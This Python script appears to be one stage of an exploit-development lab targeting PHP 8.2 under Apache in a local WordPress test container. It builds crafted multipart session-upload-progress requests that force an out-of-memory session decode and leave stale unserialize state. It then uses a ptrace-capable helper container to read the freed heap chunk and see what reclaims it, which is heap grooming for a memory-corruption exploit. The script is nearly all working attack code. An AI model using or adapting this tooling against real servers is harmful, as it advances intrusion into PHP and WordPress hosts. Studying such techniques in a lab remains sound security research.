#!/usr/bin/env python3
"""a2_groom_probe.py - placement probe: who reclaims the freed d chunk?

One keep-alive connection (same Apache child throughout):
  1. producer fire (72MB session-file decode OOM) -> d freed at shutdown,
     BG(unserialize)={level>=1, data=d} stale in the child
  2. read d's 8216 bytes (the real php_unserialize_data remnant)
  3. N+1 reader fire on the SAME connection
  4. re-read d's bytes -> WHAT reclaimed it?
All memory reads via the CAP_SYS_PTRACE helper container (the lane
container's own root cannot ptrace its siblings - docker caps).
"""
import os
import re
import socket
import struct
import subprocess
import sys
import time
import uuid

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from a2_leak_collect import cexec, helper_scan, stage_session_file  # noqa

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HOST, PORT = "127.0.0.1", 8099
CNAME = "php-firing-range-wordpress-x86-1"

def get_stale_child():
    kids = helper_scan()
    hit = next((k for k in kids if k["level"] not in (0, None)), None)
    return hit

def helper_read_at(pid, addr, size):
    script = (
        f'dd if=/proc/{pid}/mem bs=1 skip={addr} count={size} 2>/dev/null | '
        f'od -An -v -tx1 | tr -d " \\n"')
    r = subprocess.run(["docker", "run", "--rm", "--cap-add", "SYS_PTRACE",
                        f"--pid=container:{CNAME}", "php:8.2-apache",
                        "bash", "-c", script],
                       capture_output=True, text=True, timeout=60, cwd=REPO)
    h = r.stdout.strip().replace(" ", "")
    try:
        return bytes.fromhex(h)
    except ValueError:
        return b""

def mp_body(sid, extra_parts=()):
    B = b"WPFIRE"
    out = b""
    for part in extra_parts:
        out += part
    body = (b"--" + B + b"\r\n" +
            b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n' +
            sid.encode() + b"\r\n" +
            b"--" + B + b"\r\n" +
            b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npoc\r\n' +
            out +
            b"--" + B + b"\r\n" +
            b'Content-Disposition: form-data; name="u"; filename="a.txt"\r\n'
            b"Content-Type: text/plain\r\n\r\nx\r\n" +
            b"--" + B + b"--\r\n")
    head = (f"POST / HTTP/1.1\r\nHost: {HOST}\r\n"
            f"Content-Type: multipart/form-data; boundary={B.decode()}\r\n"
            f"Content-Length: {len(body)}\r\nConnection: keep-alive\r\n\r\n"
            ).encode()
    return head + body

def send_read(s, req, timeout=30):
    s.sendall(req)
    s.settimeout(timeout)
    buf = b""
    status = ""
    try:
        while True:
            d = s.recv(65536)
            if not d:
                status = "EOF"
                break
            buf += d
            if b"\r\n\r\n" in buf:
                m = re.search(rb"Content-Length: (\d+)", buf)
                if m:
                    he = buf.find(b"\r\n\r\n")
                    if len(buf) >= he + 4 + int(m.group(1)):
                        status = "COMPLETE"
                        break
                elif re.search(rb"0\r\n\r\n$", buf[-8:]):
                    status = "CHUNKED-END"
                    break
    except socket.timeout:
        status = "TIMEOUT"
    except ConnectionResetError:
        status = "RESET"
    return buf, status

def show(tag, data):
    print(f"--- {tag} ({len(data)}B) ---")
    for off in range(0, 0x100, 16):
        line = data[off:off+16]
        qs = struct.unpack("<QQ", line) if len(line) == 16 else (0, 0)
        print(f"  +0x{off:03x}: {line.hex(' ')}   | 0x{qs[0]:x} 0x{qs[1]:x}")
    # strings preview
    printable = re.findall(rb"[ -~]{6,}", data)
    if printable:
        print("  ascii:", printable[:6])

def main():
    sidA = "wp2pA" + uuid.uuid4().hex[:24]
    sidB = "wp2pB" + uuid.uuid4().hex[:24]
    cexec(f"printf 'k|s:3:\"abc\";' > /tmp/sess_{sidB}; "
          f"chown www-data:www-data /tmp/sess_{sidB}; chmod 600 /tmp/sess_{sidB}")
    print("[*] staging producer session file (72MB)")
    assert stage_session_file(sidA)
    s = socket.create_connection((HOST, PORT), timeout=15)
    buf, st = send_read(s, mp_body(sidA))
    m = re.search(rb"tried to allocate (\d+)",
                  buf.partition(b"\r\n\r\n")[2])
    print(f"[*] producer: {st} fatal={m.group(1).decode() if m else None}")
    hit = get_stale_child()
    if not hit:
        print("[-] no stale child found")
        return 1
    d = hit["data"]
    print(f"[+] stale child {hit['pid']}  d = 0x{d:x}")
    pre = helper_read_at(hit["pid"], d, 8216)
    show("d BEFORE N+1 (real php_unserialize_data remnant)", pre)
    # N+1 on the same connection: fresh SID, small session file
    buf2, st2 = send_read(s, mp_body(sidB))
    m2 = re.search(rb"tried to allocate (\d+)",
                   buf2.partition(b"\r\n\r\n")[2])
    print(f"[*] N+1: {st2} "
          f"fatal={m2.group(1).decode() if m2 else None} "
          f"len={len(buf2)}")
    post = helper_read_at(hit["pid"], d, 8216)
    show("d AFTER N+1 (what reclaimed it)", post)
    s.close()
    os.makedirs("results/wp-lastmile/a2", exist_ok=True)
    with open("results/wp-lastmile/a2/placement_probe.bin", "wb") as f:
        f.write(post)
    print("[*] saved results/wp-lastmile/a2/placement_probe.bin")
    return 0

if __name__ == "__main__":
    sys.exit(main())
